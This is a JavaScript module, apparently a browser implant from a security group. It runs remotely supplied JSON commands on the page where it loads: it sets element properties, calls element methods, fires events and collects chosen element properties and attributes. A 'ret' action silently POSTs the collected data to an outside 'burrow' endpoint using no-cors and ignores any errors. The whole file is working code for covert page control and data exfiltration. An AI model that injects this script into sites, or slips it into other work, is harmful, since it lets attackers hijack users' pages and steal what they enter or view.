// © LobeliaSecurity™
// https://github.com/LobeliaSecurity

"use strict";
export default class {
  constructor(burrow) {
    this.version = "1.0.0.ninja";
    this.burrow = burrow; // ret endpoint
    this.push = [];
    this.sleep = (msec) => new Promise((resolve) => setTimeout(resolve, msec));
    this.getProperty = (_path, _dict) => {
      let _key = _path.split(".")[0];
      let _next_path = _path.split(".").slice(1).join(".");
      if (_dict[_key] != undefined) {
        let R = this.getProperty(_next_path, _dict[_key]);
        if (R?.found) {
          return { object: _dict, property: _key };
        } else {
          return R;
        }
      } else {
        if (_path == _next_path) {
          return { found: true };
        } else {
          return { found: false };
        }
      }
    };

    this.actionHandler = {
      set: async (action) => {
        let e = document.querySelector(action.target);
        if (e) {
          if (action.property) {
            for (let propertyPath in action.property) {
              let found = this.getProperty(propertyPath, e);
              if (found.object) {
                found.object[found.property] = action.property[propertyPath];
              }
            }
          }
          if (action.attribute) {
            for (let attributeName in action.attribute) {
              e.setAttribute(attributeName, action.attribute[attributeName]);
            }
          }
        }
      },
      eval: async (action) => {
        let e = document.querySelector(action.target);
        if (e) {
          if (action.property) {
            for (let propertyPath in action.property) {
              let found = this.getProperty(propertyPath, e);
              if (found.object) {
                found.object[found.property](action.property[propertyPath]);
              }
            }
          }
        }
      },
      sleep: async (action) => {
        await this.sleep(action.target);
      },
      event: async (action) => {
        let e = document.querySelector(action.target);
        e.dispatchEvent(
          new window[action.eventObject](action.eventType, action.eventArgs)
        );
      },
      push: async (action) => {
        let e = document.querySelector(action.target);
        if (e) {
          let push = action;
          if (action.property) {
            let push_property = {};
            for (let propertyPath in action.property) {
              let found = this.getProperty(propertyPath, e);
              if (found.object) {
                push_property[propertyPath] = found.object[found.property];
              }
            }
            Object.assign(push, {
              property: push_property,
            });
          }
          if (action.attribute) {
            let push_attribute = {};
            for (let attributeName in action.attribute) {
              push_attribute[attributeName] = e.getAttribute(attributeName);
            }
            Object.assign(push, {
              attribute: push_attribute,
            });
          }
          this.push.push(push);
        }
      },
      ret: async (action) => {
        try {
          await fetch(this.burrow, {
            method: "POST",
            mode: "no-cors",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify(this.push),
          });
          this.push = [];
        } catch {}
      },
    };
  }
  async do(json) {
    for (let action of json.actions) {
      await this.actionHandler[action.type](action);
    }
  }
}
